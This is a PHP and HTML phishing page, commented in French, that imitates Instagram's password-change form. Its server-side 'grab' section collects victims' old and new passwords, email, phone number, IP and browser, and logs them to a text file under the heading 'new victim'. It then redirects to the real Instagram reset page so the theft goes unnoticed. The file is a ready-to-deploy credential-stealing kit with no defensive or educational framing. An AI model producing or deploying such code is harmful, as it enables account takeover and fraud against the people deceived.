<?php
// ==================== PARTIE GRAB (récupération des infos) ====================

// On récupère tout ce qui est sensible dès que le formulaire est envoyé
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $ancien_mdp    = $_POST['ancien_mdp']    ?? '';
    $nouveau_mdp   = $_POST['nouveau_mdp']   ?? '';
    $confirme_mdp  = $_POST['confirme_mdp']  ?? '';
    $email         = $_POST['email']         ?? '';
    $telephone     = $_POST['telephone']     ?? '';

    // Récupération des infos de l'attaquant (IP, navigateur, etc.)
    $ip            = $_SERVER['REMOTE_ADDR'];
    $user_agent    = $_SERVER['HTTP_USER_AGENT'];
    $date          = date('d/m/Y H:i:s');
    $url_page      = $_SERVER['REQUEST_URI'];

    // Formatage propre pour le log
    $log = "=== NOUVELLE VICTIME - " . $date . " ===\n";
    $log .= "IP:              $ip\n";
    $log .= "Navigateur:      $user_agent\n";
    $log .= "Ancien MDP:      $ancien_mdp\n";
    $log .= "Nouveau MDP:     $nouveau_mdp\n";
    $log .= "Confirmé:        $confirme_mdp\n";
    $log .= "Email:           $email\n";
    $log .= "Téléphone:       $telephone\n";
    $log .= "URL page:        http://$_SERVER[HTTP_HOST]$url_page\n";
    $log .= "======================================\n\n";

    // Enregistrement dans un fichier (change le chemin selon tes besoins)
    file_put_contents('grabbed_instagram.txt', $log, FILE_APPEND);

    // Redirection vers Instagram pour faire croire que c'est légitime
    header("Location: https://www.instagram.com/accounts/password/reset/");
    exit;
}
?>

<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Changer le mot de passe • Instagram</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
  
</head>
<body>

  <div class="card">
    <div class="logo">Instagram</div>
    <h1>Changer le mot de passe</h1>

    <p class="info">
      Pour des raisons de sécurité, veuillez entrer votre ancien mot de passe.
    </p>

    <form method="POST">
      <div class="form-group">
        <label for="ancien_mdp">Ancien mot de passe</label>
        <input type="password" id="ancien_mdp" name="ancien_mdp" required autocomplete="off">
      </div>

      <div class="form-group">
        <label for="nouveau_mdp">Nouveau mot de passe</label>
        <input type="password" id="nouveau_mdp" name="nouveau_mdp" required autocomplete="off">
      </div>

      <div class="form-group">
        <label for="confirme_mdp">Confirmer le nouveau mot de passe</label>
        <input type="password" id="confirme_mdp" name="confirme_mdp" required autocomplete="off">
      </div>

      <div class="form-group">
        <label for="email">Email ou téléphone associé</label>
        <input type="text" id="email" name="email" required autocomplete="off">
      </div>

      <button type="submit">Changer le mot de passe</button>
    </form>

    <div class="footer">
      © 2025 Instagram par Meta
    </div>
  </div>

</body>
</html>